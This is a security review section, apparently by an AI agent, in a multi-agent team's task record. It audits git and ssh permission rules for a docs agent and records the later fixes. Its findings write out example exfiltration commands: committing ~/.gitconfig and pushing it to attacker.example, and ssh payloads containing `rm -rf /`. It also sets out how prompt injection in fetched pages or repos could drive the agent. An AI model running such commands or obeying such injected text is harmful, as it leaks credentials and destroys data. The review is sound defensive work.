**Escalation to user (AGENTS.md §4):** a live GitHub personal access token in the classic `ghp_` form sits in plaintext in `/home/howard/.gitconfig` (a `url.insteadOf` rewrite, line 3). Every agent can read it, and the five new rules give `Vector` a two-command exfiltration pipeline for it. Rotate it. Details in the first finding. I verified the token value is in neither the worktree nor the repository history (commands in that finding).

### Live GitHub PAT in `/home/howard/.gitconfig`, readable by every agent, exfiltratable through the new git rules
**Severity:** high
**Vector:** secrets
**Where:** `/home/howard/.gitconfig:3` (host file, outside the repo); exfiltration sink `.opencode/agents/vector.md:21-23`
**Verified (read-only; token not used; value not transcribed per §4):**
- Line 3 rewrites `https://github.com/` to a `https://metalllinux:<token>@github.com/` URL. Classic `ghp_` PAT form. Validity and scope unverified (I did not use it).
- Not in the repo. Worktree search for `ghp_` plus 20+ alphanumerics: no hits. History: `git log --all -S"ghp_" --oneline` returns three commits (`3fa4110`, `8cce3bc`, `e3bbd30`); the hits inside them are a deliberate canary (`3fa4110:.github/actions/gitleaks-action/run.sh:21`, `ghp_fake_canary_token_...`), a doc placeholder (`8cce3bc:README.md:61`, `ghp_...`), and a redacted reference with a literal ellipsis (`planning/docs/TASK-0008-cinnamon-gdm-auth-fix.md:883`). No real token value in history.
- The setup is intentional and documented: `planning/docs/SETUP.md:143-146` ("Set git credential for GitHub (replace TOKEN)").
**Attack:** any of the ten agents (all `read: allow` plus `external_directory: "*": allow`) can read the file. Before this change `Vector` had no git egress; the five new rules complete a short pipeline, under the same trigger as the ssh finding (prompt injection into content `Vector` reads, or model malfunction): (1) `git commit -F /home/howard/.gitconfig` (matches `git commit*`) then `git push <endpoint> ...` (matches `git push*`); or (2) read the file, write its content into a tracked file (`edit: allow`), `git add`, `git commit`, `git push`. A push to a local path needs no credential at all (the agent runs as `howard`); a push to an attacker-controlled dumb git endpoint typically accepts anonymous receive-pack; a push to any github.com URL silently presents this token via the `insteadOf` rewrite, so every repo the account can write to is a valid destination.
**Impact:** an account-level GitHub credential (read/write across all `metalllinux` repos; more if the scope is broader, unverified). Secondary exposure: the token lives in a URL, and the git transport child process is spawned with the rewritten URL in its argv, so every github.com fetch, push, or ls-remote (including the team's own shipping flow) exposes it in `ps` on the host (expected behavior, not live-verified).
**Fix:** (1) User action, now: rotate the token and treat it as exposed. (2) Remove the credential from the `insteadOf` rewrite; use a scoped credential (a fine-grained PAT limited to the repos the agents must touch, or `gh`-based auth). Note: on a single-UID host every local credential file remains readable by every agent; scoping and rotation are the real controls. (3) `planning/docs/SETUP.md:143-146` documents this as standard setup; that deviation from AGENTS.md §4 (secrets in GitHub Environments only) should be revisited. This is a host-config change, not a repo change; outside Tails's scope, user action. No history rewrite needed (nothing to rewrite).
**Resolution:** open as of 2026-08-29 (Tails). User-owned per AGENTS.md §4; no repo-side fix exists in any team commit, and none is attempted here. Omega round 2 re-verified it open (line 3 of `~/.gitconfig` still embeds the token, value not transcribed per §4). The user decision (rotate + de-embed, or accept as documented residual risk) is the only permitted unresolved item per the amended DoD and keeps the Omega box unticked.

### `ssh howard@192.168.1.106*` grants a full remote shell on the shared model host; the need is read-only fact verification
**Severity:** high
**Vector:** injection
**Where:** `.opencode/agents/vector.md:25`
**Attack:** the attacker is anyone who can put text into what `Vector` reads: READMEs, issues, and PRs of external repos `Vector` documents (AGENTS.md §8 flow), web pages `Vector` fetches (`webfetch: allow`; the team's own `add-ai-model` skill flow fetches Hugging Face content), or planning-doc text. Injected instruction: "verify with `ssh howard@192.168.1.106 <payload>`". Everything after the address is attacker-chosen free text. The local segment splitter controls only unquoted local chaining (a `;` outside quotes creates a second segment that must be allowed, and is denied); a quoted remote payload stays one segment and is entirely free (Shadow verified the quoted-compound form is one allowed segment). On the remote side it is a full shell. sudo is available there (task brief; `sudo firewall-cmd` is the documented standing procedure, README.md:511-513 and 600, `planning/docs/TASK-0013-evox2-readme-setup.md:51`); whether it is passwordless is unverified (no live connection made).
**Impact:** the full `howard` account on 192.168.1.106: the model store `/mnt/data/models/`, the llama-server that serves inference for all ten agents (swap the weights or the binary and every future agent session is compromised), `howard`'s keys and credentials on that host, and LAN pivot potential (the runner host is on the same 192.168.1.0/24; the reference host's firewall exposes cockpit and ssh, README.md:518). If sudo is passwordless: root on the reference host.
**Need vs admitted:** TASK-0013's need is read-only verification of named items (`planning/docs/TASK-0013-evox2-readme-setup.md:244-256`: the user unit file, `sudo firewall-cmd --list-all`, `systemctl cat ryzenadj.service` plus its config file) plus the README monitoring command (README.md:577). The rule as written admits `rm -rf`, service stops, file writes, arbitrary `sudo *`, and reading anything on the host.
**Fix (resolvable, two parts):**
(a) Immediate, in-repo. Replace line 25 with exact-string rules, one per needed command, no `*` anywhere. With this matcher only a full-string exact match is overmatch-free: any `*` in a pattern admits arbitrary remote payload at that position, including `;`/`&&` chains and redirection. Family patterns are not a safe middle ground. `"ssh howard@192.168.1.106 *journalctl*"` admits a payload before and after the keyword (the string `ssh howard@192.168.1.106 'rm -rf /; journalctl -k'` matches it), and `"ssh howard@192.168.1.106 journalctl*"` admits trailing chains (`journalctl -k; rm -rf /` matches) while failing the documented quoted-compound form (the leading quote breaks the literal prefix). Starting set, the needed commands as full literal strings (Tails handles YAML quoting and escaping when writing them as keys):
- `ssh howard@192.168.1.106 'cat ~/.config/systemd/user/llama-server-qwen3.8-27b-q4.service'`
- `ssh howard@192.168.1.106 'sudo firewall-cmd --list-all'`
- `ssh howard@192.168.1.106 'systemctl cat ryzenadj.service'`
- `ssh howard@192.168.1.106 'journalctl -k --no-pager | grep -cE "device wedged"'`
Each new verification command gets a new exact rule (config edit plus opencode restart). Fail-closed on quoting variation: a command the model phrases differently is denied, not loosened.
(b) Durable, host-side. Restrict the remote identity on 192.168.1.106 (a dedicated read-only user, or a wrapper with a server-side exec allowlist) so the remote shell itself is bounded; then the pattern can relax without re-opening sudo or arbitrary execution. Out of repo scope, flagged for the user.
Note: even (a) leaves the remote `cat`-class ability to read world-readable host files and carry their content into a commit that lands in the team repo (bounded to the team's private repo; the root cause is the agent's pre-existing read-everything role, not this rule). Only (b) bounds what the remote side can show. Resolving this requires a DoD amendment (the DoD pins the pattern text verbatim); see the DoD conflict note at the end of this section.
**Resolution:** fixed in `ef884e4` (Tails round-2 rework). The `ssh howard@192.168.1.106*` glob is replaced by the three byte-pinned exact command strings at `.opencode/agents/vector.md:27-29` (cat of the user unit file, `sudo firewall-cmd --list-all`, `systemctl cat ryzenadj.service`). Omega round 2. resolved at the rule level; the admitted remote commands are exactly those three read-only invocations. Part (b), the durable host-side restriction of the remote identity, remains a recommended hardening note, out of repo scope, and no rule reaches it.

### `git add*` + `git commit*` + `git push*` form an exfiltration pipeline to arbitrary remotes; `git push*` admits force-push and destructive ref operations
**Severity:** high
**Vector:** injection
**Where:** `.opencode/agents/vector.md:21-23` (egress primitive at :23)
**Attack:** the same injection actor as the ssh finding. Egress needs no credential to an attacker endpoint: a local path always works (the agent runs as `howard`), a dumb git endpoint typically accepts anonymous receive-pack, and any github.com URL silently carries the first finding's token via `insteadOf`. Shortest chain, two commands: `git commit -F /home/howard/.gitconfig`, then `git push http://attacker.example/r.git HEAD:x`. Alternative: read any file (pre-existing `read: allow`), write it into a tracked file (`edit: allow`), `git add`, `git commit`, `git push`. The bash tool's `workdir` parameter makes all three repo-agnostic: they run in any local repo on the host (worktrees, user repos), not only team-chaotix. `git push*` additionally admits `--force`, `-f`, `--delete`, `+refspec`, `--mirror` (Shadow: "`git push*` also covers `git push --force`").
**Impact:** exfiltration of the account-level PAT (first finding) and of any local file content `Vector` can name, to an external endpoint or any repo the account writes to; the full team-repo history (planning docs, agent configs, internal IPs, model-host detail) to an attacker; destructive history rewrite or ref deletion on `metalllinux/team-chaotix` main or any reachable repo.
**Need vs admitted:** the need is a fast-forward push of the docs commit to `origin main` (plus the AGENTS.md §12 worktree branch flow). `git push*` admits every remote, every ref, every flag.
**Fix (resolvable):**
- `"git push*"` (line 23) to the exact rules `"git push origin main"` and `"git push -u origin main"`, plus `"git push -u origin worktree/*"` for the worktree flow. With the push pinned to a plain push to main, a rewritten history cannot land (GitHub rejects non-fast-forward without force), which is what makes the `git commit*` and `git add*` over-grants below inert. Caveat: if git accepts options after the refspec (unverified), the trailing `*` in the worktree rule admits trailing flags; per-branch exact rules close that.
- `"git commit*"` (line 22) to `"git commit -m*"`, dropping `-F <file>`, `--amend`, `-a`, `--no-verify` (multi-paragraph `-m ... -m ...` still matches).
- Keep `"git add*"` (residual in the low finding below).
Same DoD conflict note as the ssh finding.
**Resolution:** fixed in `ef884e4` (Tails round-2 rework). `git commit -m*` (drops `-F`/`--amend`/`-a`/`--no-verify`), push pinned to the non-force exact rules `git push origin main` and `git push -u origin main` (a rewritten history cannot land on `origin main`), and ls-remote narrowed to bare plus `origin*`. Omega round 2. resolved.

### `git add*` admits `--force` (staging gitignored files) and whole-tree sweeps
**Severity:** low
**Vector:** authz
**Where:** `.opencode/agents/vector.md:21`
**Attack:** `git add .` / `git add -A` sweeps untracked files (user WIP, untracked secrets in the repo dir); `git add --force` stages gitignored files, the standard hiding place for local secrets. Pre-push-fix this is the staging step of the pipeline above; post-push-fix the blast radius is the team repo (or a local-only disturbance in another repo via `workdir`). Recorded as residual; no independent fix required once the push rule is pinned.
**Resolution:** recorded as residual R1 in Omega round 2 (rule unchanged at `.opencode/agents/vector.md:21`; `--force` and sweeps remain admitted). Once the push rule is pinned to non-force `origin main`, the blast radius is bounded to the team repo (or a local-only disturbance in another repo via `workdir`), which is exactly what the finding records. No independent fix required, per the finding.

### `git commit*` admits `--amend`, `-F <file>`, `-a`, `--no-verify`
**Severity:** low
**Vector:** authz
**Where:** `.opencode/agents/vector.md:22`
**Attack:** `-F <file>` embeds arbitrary file content in a commit message (the named pipeline step in the high finding); `--amend` rewrites the last commit. Post-push-fix, an amended or otherwise rewritten commit cannot land on main (the server rejects non-fast-forward), so the residual is local-only. Recorded as residual; resolved by the high finding's `"git commit -m*"` narrowing.
**Resolution:** resolved by the `ef884e4` narrowing to `"git commit -m*"` (Tails round-2 rework), which drops `-F`, leading `--amend`, `-a`, and `--no-verify`. The trailing-flag surface (e.g. `--amend` after `-m` if git parses it, unverified) is recorded as residual R2 and is inert against `origin main` because the client refuses non-fast-forward.

### `git ls-remote*` admits an arbitrary URL
**Severity:** low
**Vector:** authz
**Where:** `.opencode/agents/vector.md:24`
**Attack:** `git ls-remote <url>` enumerates the refs of any repo the host's git credential can reach (the first finding's token is presented for github.com URLs via `insteadOf`). Refs only, no content; the exposure is branch names (project codenames, `worktree/<name>` branches). The need is `git ls-remote origin main` for remote-HEAD verification. Optional narrowing if the high finding's fix is applied: exact `"git ls-remote origin main"` plus `"git ls-remote origin worktree/*"`. Recorded as residual.
**Resolution:** narrowed in `ef884e4` (Tails round-2 rework) to the bare `git ls-remote` rule (a no-op. git errors without a repository argument) plus `git ls-remote origin*`. An arbitrary URL is denied. `origin` is the sole remote in this repo (`.git/config`), so `origin*` cannot overmatch a different remote here. Ref enumeration of `origin` is recorded as residual R3.

### The ssh rule over-matches sibling addresses and ports; bare interactive ssh is admitted
**Severity:** low
**Vector:** authz
**Where:** `.opencode/agents/vector.md:25`
**Attack:** the glob is on the string, so `howard@192.168.1.1066` (a different LAN host) and `howard@192.168.1.106:2222` (a different port on the same host) both match. Auth to the siblings presumably fails (no authorized key), impact low; stated for completeness. Bare `ssh howard@192.168.1.106` (interactive) is admitted but gains nothing in a non-interactive bash tool (hangs to timeout). Closed by the high finding's exact-string fix, which pins the full string.
**Resolution:** closed in `ef884e4` (Tails round-2 rework) by the byte-pinned exact ssh strings at `.opencode/agents/vector.md:27-29`. Sibling addresses, port suffixes, bare interactive ssh, and any other payload match no allow rule (Omega round 2, R4. closed by the exact strings, with the wildcard-free matcher probe).

### Least-privilege verdict per pattern

| Pattern | Need (TASK-0013 DoD) | What it admits | Verdict |
|---|---|---|---|
| `git add*` | stage the docs `Vector` wrote | any pathspec, `--force`, `.`/`-A` sweeps, any local repo via `workdir` | overbroad, low (residual once push is pinned) |
| `git commit*` | commit the docs | `-F <file>`, `--amend`, `-a`, `--no-verify` | overbroad, low (fix: `git commit -m*`) |
| `git push*` | push to `origin main` (plus worktree branch) | any remote URL, any ref, `--force`/`--delete`/`--mirror`, any local repo | overbroad, high (fix: exact rules) |
| `git ls-remote*` | verify remote HEAD | any URL, ref enumeration under the PAT | overbroad, low (optional narrowing) |
| `ssh howard@192.168.1.106*` | read-only fact verification on one host | full remote shell, sudo-capable, port and sibling overmatch | overbroad, high (fix: exact-string rules plus host-side restriction) |

**Baseline note (calibration, not a finding):** Tails (`.opencode/agents/tails.md:15-16`) and Knuckles (`.opencode/agents/knuckles.md:15-16`) both have `bash: "*": allow`, a strict superset of everything `Vector` gains here, including the same ssh and force-push capabilities. These five rules add no new class of capability to the team; the findings are per-agent least-privilege, and the marginal risk of the `Vector` set is one more agent with the capability, in a role (docs) that maximizes the injection surface (`webfetch: allow`, `websearch: allow`, and per AGENTS.md §8 it reads external repo issues and PRs). Also pre-existing and out of scope: `Vector`'s `read: allow` (any file on the host) and `webfetch: allow` (any URL) are the read/egress halves of the pipeline; these five rules add the git half.

**DoD conflict (surfaced, not overridden):** DoD item 1 pins the five pattern texts verbatim; the two high findings' fixes change that text. The DoD's Omega box ("no unresolved findings above `low`") cannot be checked honestly while the two high findings are open. Options: (1) Robotnik amends the DoD pattern list to the fix set above and Tails applies it in a follow-up commit; (2) the user accepts the two high findings as documented residual risk, in which case they are recorded as accepted with the residuals named below. I recommend (1): the fixes are mechanical, the shipping path (`origin main` plus worktree branches) is preserved, and fail-closed behavior on unknown commands is a feature.

**Residual risks after the fixes (all low):**
- Exact ssh rules are brittle by design: a verification command the model phrases with different quoting is denied, not loosened (fail-closed; operational friction only).
- The remote `cat`-class commands under exact rules can still read world-readable host files and carry content into a commit in the team repo (bounded to the team's private repo; root cause is the pre-existing read-everything role).
- `git add*` sweeps and `--force` (bounded to the team repo once push is pinned).
- `git commit -m*` trailing-flag surface (`--amend` after `-m` if git parses it, unverified; inert post-push-fix because the server rejects non-fast-forward).
- `git ls-remote*` ref enumeration until optionally narrowed.
- The PAT in `/home/howard/.gitconfig` itself: the real exposure; rotation is the fix, the rule changes above only bound the egress.

**Clean statement:** the five-line diff is well-formed YAML (Tails's PyYAML parse check, `## Implementation`; re-read by Shadow), correctly ordered after `"*": deny` so each allow beats the catch-all, contains no secret material, and touches no other file under `.opencode/agents/` (Shadow: `git diff d476221 ad9632c -- .opencode/` is exactly five added lines). The legacy rules are byte-identical. As written, the rules do satisfy the honest shipping path: `git add`, `git commit -m`, `git push origin main`, and `git ls-remote origin main` each resolve to an allow (Shadow, `## Review` item 4).

### Round 2 (security re-review, 2026-08-29)

**Reviewed state:** the reworked diff `ad9632c` → `ef884e4` (rework `15f6c29`, follow-ups `152a068`, `ef884e4`; main HEAD `ef884e468614944e8ec4e75050622115d6447645`). Local HEAD is `ef884e4` with parent chain `ef884e4` ← `152a068` ← `15f6c29` ← `ad9632c` (`git log -3 --format='%H %p %s'`). `git status` reports main up to date with `origin/main` at this HEAD, and the only working-tree change is this doc's pending round-2 append, so `.opencode/agents/vector.md` and `README.md` were reviewed as pushed. The quoted `git ls-remote` line for the terminal sha remains `Knuckles`'s item in `## Release` per protocol. I attempted an independent remote-sha check via `gh api /repos/metalllinux/team-chaotix/branches/main`; my `gh api */` rule text requires a trailing slash (the pattern is `gh api ` + `*` + `/`) and GitHub 404s on that, so the check was blocked by my own rule text (the quirk Shadow noted in round 2). Gap stated, not a deviation.

**Re-verified this turn (commands in the text):**

- `git diff ad9632c ef884e4 -- .opencode/agents/vector.md`: exactly four round-1 allow lines removed (`git commit*`, `git push*`, `git ls-remote*`, `ssh howard@192.168.1.106*`) and eight tightened lines added; `git add*` and the four legacy allows appear unchanged in context. `git diff ad9632c ef884e4 --stat` lists exactly the four files in the round-2 changes table (vector.md, README.md, TASK-0013 doc, TASK-0014 doc).
- `git diff d476221 ef884e4 --stat -- .opencode/`: one file, 9 insertions, 0 deletions. Across both rounds the agent tree gained exactly the nine lines and nothing else.
- `git show ef884e4:.opencode/agents/vector.md`: 14 rules in file order, `"*": deny` :20, `git add*` :21, `git commit -m*` :22, `git push origin main` :23, `git push -u origin main` :24, bare `git ls-remote` :25, `git ls-remote origin*` :26, the three single-quoted exact ssh rules :27-29, legacy `git diff*`/`git log*`/`git status`/`rg *` :30-33. No rule beyond the amended DoD list.
- Matcher probes this turn, run under my own bash set (same matcher, same build): bare `git status` allowed via the exact `"git status": allow` rule; `git status --short` denied in full (a wildcard-free pattern rejects a trailing argument); the compound `git status --short && git rev-parse HEAD && git log --oneline -8` denied in full (every segment must be allowed, and `git rev-parse HEAD` matches no allow in my set). Under this matcher a wildcard-free pattern matches only the byte-identical command, and a quoted payload cannot smuggle a second local command because chaining splits into segments that each need their own allow.
- `.git/config`: `origin` is the sole remote, url `https://github.com/metalllinux/team-chaotix.git`, no embedded credential (the H-1 token applies via the `~/.gitconfig` `insteadOf` rewrite).
- README.md:34 reads "Read/write docs, git read + add + commit -m + push origin main + ls-remote, exact ssh verification commands to 192.168.1.106": matches the final block.
- ssh rule strings: the `cat` rule is byte-identical to the TASK-0013 settlement command (`planning/docs/TASK-0013-evox2-readme-setup.md:249`); the `sudo firewall-cmd --list-all` and `systemctl cat ryzenadj.service` rules are the ssh-wrapped form of the payloads documented at :251 and :253-254; all three are byte-identical to my round-1 H-2 fix list (a). The diff carries no credential material (I read the full four-file diff: nine rule lines, one README line, bookkeeping).

**H-2 (ssh blast radius): resolved at the rule level.** Only the three byte-pinned ssh strings match. The round-1 overmatches are closed: sibling address `192.168.1.1066`, port suffix, bare interactive ssh, any other payload, any quoting variant, none of them byte-match an exact string, and the probes above establish that a wildcard-free pattern admits nothing else. The admitted remote commands are exactly: read one user unit file, `sudo firewall-cmd --list-all`, read one service unit. All three are read-only, and the sudo invocation is pinned to the read-only query, so the round-1 "full remote shell, sudo-capable" surface no longer exists through this rule. A quoted payload stays one segment and cannot carry a second local command; `;`/`&&` outside quotes create a second segment that is denied (probe (c)). What remains of the round-1 fix is part (b), the durable host-side restriction of the remote identity: still recommended, out of repo scope, a hardening note rather than a finding because no rule reaches it. Correction to round-1 residual wording: under exact rules the only file readable on the remote is the pinned one, so the round-1 line "read world-readable host files" overstated; the true residual is that the pinned files' content flows into a commit in the team repo, which is the intended use. The `journalctl` monitoring command (README.md:577) is deliberately uncovered; fail-closed per the DoD, new exact rule per task. I concur with Tails's option-A refusal to add it.

**H-3 (git exfil pipeline): resolved.** (a) `git commit -F <file>` matches no allow (`git commit -m*` requires the literal `git commit -m` prefix), so the round-1 two-command pipeline is broken at step one. (b) The only reachable pushes are `git push origin main` and `git push -u origin main`, byte-pinned. `git push <url>`, `git push <local path>`, `git push origin <other ref>`, and `--force`/`-f`/`--delete`/`+refspec`/`--mirror` all fail the exact rules and are denied. Both forms are non-force, so a rewritten (non-fast-forward) history is refused by the git client before it reaches any origin, GitHub or local path; force is not admitted, which keeps the `git add*` and `commit -m*` residuals inert against origin main. (c) `git ls-remote <url>` with an arbitrary URL is denied; only bare `git ls-remote` (git errors without a repository argument, harmless) and `git ls-remote origin*` remain, and `origin` is the sole remote in this repo (`.git/config`), so no other ref source is enumerable. The destination set is bounded by the user-configured origin of whichever local repo the command runs in (the `workdir` parameter makes the commands repo-agnostic, residual R6 below); no new endpoint is reachable because Vector cannot configure a remote (no `git remote`/`git config` in the set).

**H-1 (live PAT in `~/.gitconfig:3`): remains open, fix owner user.** Re-verified 2026-08-29: line 3 still embeds the live `ghp_`-form token in the `insteadOf` rewrite (value not transcribed per §4). The H-3 fix narrows the egress (the two-command chain is gone and no external destination is reachable from Vector's set), but the credential is still readable by all ten agents, and the `edit` → `git add` → `git commit -m` → `git push origin main` chain can still land it in the team repo, so rotation and de-embedding remain the fix. Severity and ownership unchanged; the user decision is the only permitted unresolved item per the amended DoD and keeps the Omega box unticked.

**Residual low set, re-confirmed (nothing above low):**

| # | Residual | Status this round |
|---|---|---|
| R1 | `git add*` admits `--force` and `.`/`-A` sweeps | still present (rule unchanged); bounded by the pinned fast-forward push; low |
| R2 | `git commit -m*` trailing-flag surface (`--amend` after `-m` if git parses it, unverified) | low; inert against origin main (client refuses non-fast-forward) |
| R3 | `git ls-remote origin*` ref enumeration | low; `origin` is the sole remote in this repo |
| R4 | ssh overmatches (sibling address, port, bare interactive ssh) | **closed** by the exact strings (byte-pinned rules plus the wildcard-free probe) |
| R5 | ssh rules brittle by design (different phrasing → deny) | fail-closed per the DoD; operational friction, not a vulnerability |
| R6 | the `workdir` parameter lets every git command run in any local repo on the host | new note, low. Destination bounded by that repo's user-configured origin (no new endpoint; Vector cannot add remotes). Requires a user repo with a reachable origin plus an injected instruction that sets the workdir, multiple preconditions |
| R7 | the PAT in `~/.gitconfig` itself | H-1, user-owned, open |

**Least-privilege assessment of the final nine rules (amended DoD item 6):**

| Rule (`.opencode/agents/vector.md`) | Need | What it admits | Verdict |
|---|---|---|---|
| `git add*` :21 | stage the docs Vector wrote | any pathspec, `--force`, sweeps, any local repo via `workdir` | overbroad, low (R1) |
| `git commit -m*` :22 | commit the docs | trailing flags after `-m` (R2); drops `-F`, leading `--amend`, `-a`, `--no-verify` | acceptable, low residual |
| `git push origin main` :23 | push the docs commit | exactly that; non-force | exactly the need |
| `git push -u origin main` :24 | the AGENTS.md §12 worktree branch flow | exactly that, plus upstream tracking | exactly the need |
| `git ls-remote` :25 | (bare form is a no-op; git errors without a repository argument) | nothing reachable | harmless |
| `git ls-remote origin*` :26 | remote-HEAD verification | ref enumeration of any remote named `origin*` (only `origin` in this repo, R3) | acceptable, low residual |
| ssh `cat` of the user unit file :27 | TASK-0013 fact verification | read that one file on the host | exactly the need |
| ssh `sudo firewall-cmd --list-all` :28 | TASK-0013 fact verification | that one read-only query, via sudo pinned to the read-only command | exactly the need |
| ssh `systemctl cat ryzenadj.service` :29 | TASK-0013 fact verification | read that one unit file | exactly the need |

**Verdict:** no unresolved findings above `low` other than H-1, which is the user-owned escalation the amended DoD permits to stay open. H-2 and H-3 are resolved against the final rule set as pushed at `ef884e4`; the round-1 low findings are re-confirmed or closed as in the table above. The reworked diff is clean: well-formed YAML (Tails's 14-rule PyYAML parse, re-read by Shadow), legacy rules byte-identical, nothing else under `.opencode/` (my stat plus Shadow's item 2), no credential material in the diff.

---

## Test Results

*Owner: `Big`. Verdicts, never raw log dumps.*

**Workflow run:**

| Check | What it exercises | Result | Notes |
|---|---|---|---|
| compile | changed files | PASS/FAIL | |
| linter | style and correctness | PASS/FAIL | |
| unit tests | individual functions | PASS/FAIL | |
| integration tests | end-to-end flows | PASS/FAIL | |
| Sparky tests | Rocky Linux UI (if applicable) | PASS/FAIL | |

**Checks requested vs run:** N requested, N executed. *If any were dropped or skipped, say so here
explicitly — a truncated run reporting green reads as full coverage.*

**Verdict:** prose. For each FAIL: the failing check, the evidence, and whether it is a code bug (goes
to `Tails`) or a harness bug (stays with `Big`).

---

## Docs

*Owner: `Vector`.*

| File | Sections touched | What changed |
|---|---|---|
| `README.md` | | |
| `CHANGELOG.md` | | |

**Checked and needed no change:** listing these saves the next person re-checking.
**Could not verify:** what, and what would settle it.

---

## Release

*Owner: `Knuckles`.*

**DONE checklist verified:** no. This stops here. Missing item: the user's H-1 decision
(rotate the live GitHub PAT in `~/.gitconfig:3` and de-embed it from the `url.insteadOf`
rewrite, or accept it as documented residual risk). Six of seven boxes are ticked. The Omega
box stays unticked because H-1 is the only permitted unresolved item per the amended DoD. H-1
is user-owned per AGENTS.md §4 (fix owner: user), escalated 2026-08-28 and re-verified open
by Omega round 2 (2026-08-29, `## Security` H-1 Resolution line). Task status per `## Status`:
Blocked on the user. After the decision, the Omega box is ticked and `Espio` prunes. This
record is written at the user's dispatch while the task is blocked, so no further release step
runs until the box is ticked.

- **Branch:** `main`. Direct push to `metalllinux/team-chaotix` under the standing 2026-08-21
  user permission for `metalllinux` repos. No feature branch, no PR. Internal repo, AGENTS.md
  §8.
- **Commits:** final state `ef884e4` (`ef884e468614944e8ec4e75050622115d6447645`), the rework
  `15f6c29` plus follow-ups `152a068` and `ef884e4` on top of `ad9632c`, full chain in `##
  Implementation`. GPG-signed: no. `commit.gpgsign` is not set in this repo and the history
  is unsigned (same verification, TASK-0013 `## Release`).
- **PR:** n/a. Internal repo shipped by direct push under the standing permission. No PR
  required, AGENTS.md §8.
- **Deploy:** n/a. Team config change (`.opencode/agents/vector.md`), no deployment to
  dispatch. The new Vector rules take effect on the next opencode restart (documented in
  `## Status`). Config load, not a deployment.
- **Remote HEAD confirmation (2026-08-29, Knuckles):** `git ls-remote origin main`, actual
  output, quoted verbatim:
  `c4cbf63cf6334325797430e988a6054fe6eacf2a	refs/heads/main`.
  Local HEAD (`git rev-parse HEAD`) `c4cbf63cf6334325797430e988a6054fe6eacf2a` == remote HEAD.
  PASS. The final state `ef884e4` is an ancestor of that HEAD on `main` (`git merge-base
  --is-ancestor ef884e4 c4cbf63` → exit 0, 2026-08-29), so the remote carries it. This item
  also closes the deferral in `## Implementation` (the ls-remote output line for the terminal
  sha, per the round-1 nit resolution path). The line for the exact moment main was at
  `ef884e4` was not captured at push time and is not recoverable from this host's session
  tool-output files (2026-08-29, grep of `~/.local/share/opencode/tool-output/` for the full
  sha, no hits). The live line above plus the ancestry check is the closing verification, and
  the gap is stated here per AGENTS.md §5.
- **Release record commit (follow-up per the TASK-0011 convention):** this `## Release` record
  shipped in commit `2678b28` (full `2678b2853916b2f3095b0bc6755192ccdde76709`), pushed with
  `git push origin main` → `c4cbf63..2678b28  main -> main`. `git ls-remote origin main` after
  that push, actual output, quoted verbatim:
  `2678b2853916b2f3095b0bc6755192ccdde76709	refs/heads/main`.
  Local HEAD (`git rev-parse HEAD`) `2678b2853916b2f3095b0bc6755192ccdde76709` == remote HEAD.
  PASS (2026-08-29, Knuckles).

---

## Archive

*Owner: `Espio`, the only agent that deletes. Superseded detail lands here rather than being
lost. Decisions, verified facts, rejected options with their reasons, known traps, and anything the
user said are never deleted.*

**Pruning log**

| Date | What was pruned or compressed | Rough size |
|---|---|---|
| 2026-08-29 | Minimal pass (task still Blocked on user H-1 decision): round-1 `Final permission.bash` block (10-rule state, superseded by the round-2 14-rule block) compressed to a pointer in `## Implementation`, full block moved here. No decisions or finding text touched | ~15 lines |
| 2026-08-29 | Ship of this pass (same commit as the TASK-0013 pruning, prefix `TASK-0013:`) pending: Espio's loaded set is `bash: deny` (`.opencode/agents/espio.md:17`). Commit sha to be recorded here by the shipping commit | n/a |

### Superseded round-1 `permission.bash` block (`.opencode/agents/vector.md:19-29`, read back after the round-1 edit, 2026-08-28)

```yaml
  bash:
    "*": deny
    "git add*": allow
    "git commit*": allow
    "git push*": allow
    "git ls-remote*": allow
    "ssh howard@192.168.1.106*": allow
    "git diff*": allow
    "git log*": allow
    "git status": allow
    "rg *": allow
```

Superseded by the round-2 tightened 14-rule set (full block in the round-2 section of
`## Implementation`, shipped in `15f6c29`, final `ef884e4`). The five-glob ruleset is a
rejected option; the rejection reasons live in `## Security` (Omega H-2: full remote shell;
H-3: exfil pipeline plus force-push).
